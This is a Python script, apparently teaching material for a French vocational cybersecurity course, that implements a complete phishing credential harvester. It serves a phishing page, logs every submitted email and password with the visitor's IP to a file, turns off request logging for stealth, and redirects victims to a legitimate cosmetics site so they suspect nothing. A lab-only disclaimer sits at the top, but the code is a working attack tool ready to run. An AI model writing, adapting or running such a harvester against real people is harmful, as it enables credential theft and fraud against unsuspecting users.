#!/usr/bin/env python3
"""
Credential Harvester — Collecteur d'identifiants pour TP Cybersécurité
BTS SIO B2 — Module 3.2 — Identité Numérique

  USAGE PÉDAGOGIQUE UNIQUEMENT — Environnement de laboratoire isolé
    Articles 323-1 à 323-8 du Code pénal

Ce script :
1. Sert une page de phishing (GET /)
2. Capture les identifiants soumis (POST /)
3. Les enregistre dans un fichier de log
4. Redirige la victime vers le site légitime (302)
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import urllib.parse
import os

# === CONFIGURATION ===
PORT = 80
PHISHING_PAGE = "/var/www/html/index.html"
LOG_FILE = "/opt/creds.txt"
REDIRECT_URL = "https://kbeauty-cosmetics.com/"
SEP = "=" * 50


class CredentialHarvester(BaseHTTPRequestHandler):
    """Serveur HTTP qui sert la page piégée et capture les identifiants."""

    def do_GET(self):
        """Sert la page de phishing au visiteur."""
        try:
            with open(PHISHING_PAGE, "rb") as f:
                page = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(page)
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Page not found")

    def do_POST(self):
        """Capture les identifiants soumis via le formulaire."""
        # Lire le corps de la requête POST
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")

        # Parser les paramètres (email=xxx&password=yyy)
        params = urllib.parse.parse_qs(body)

        # Formater l'entrée de log
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = self.client_address[0]

        entry = "\n" + SEP + "\n"
        entry += "[" + ts + "] CREDENTIALS CAPTURED from " + ip + "\n"
        entry += SEP + "\n"
        for k, v in params.items():
            entry += "  " + k + " = " + v[0] + "\n"
        entry += SEP + "\n"

        # Sauvegarder dans le fichier de log
        with open(LOG_FILE, "a") as f:
            f.write(entry)

        # Afficher dans la console
        print(entry)

        # Rediriger la victime vers le site légitime
        # → La victime ne se doute de rien
        self.send_response(302)
        self.send_header("Location", REDIRECT_URL)
        self.end_headers()

    def log_message(self, format, *args):
        """Supprimer les logs HTTP par défaut (discrétion)."""
        pass


if __name__ == "__main__":
    print("[*] K Beauty Credential Harvester")
    print("[*] Port: " + str(PORT))
    print("[*] Page: " + PHISHING_PAGE)
    print("[*] Logs: " + LOG_FILE)
    print("[*] Redirect: " + REDIRECT_URL)
    print("[*] Waiting for victims...\n")

    server = HTTPServer(("0.0.0.0", PORT), CredentialHarvester)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Harvester stopped.")
        server.server_close()
